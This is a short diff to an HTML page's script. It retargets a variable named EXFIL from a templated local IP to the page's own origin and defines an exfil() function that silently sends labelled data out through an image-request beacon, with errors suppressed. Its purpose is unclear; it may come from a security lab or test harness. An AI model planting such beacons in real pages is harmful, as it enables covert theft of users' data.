@@ -25,7 +25,7 @@ pre { background: #f0f0f0; padding: 10px; border-radius: 6px; font-size: 12px; o
 </div>
 
 <script>
-var EXFIL = "http://{{LOCAL_IP}}:8000/collect";
+var EXFIL = window.location.origin + "/collect";
 
 function exfil(label, data) {
     try { new Image().src = EXFIL + "?d=" + encodeURIComponent(label + "=" + data); } catch(e) {}
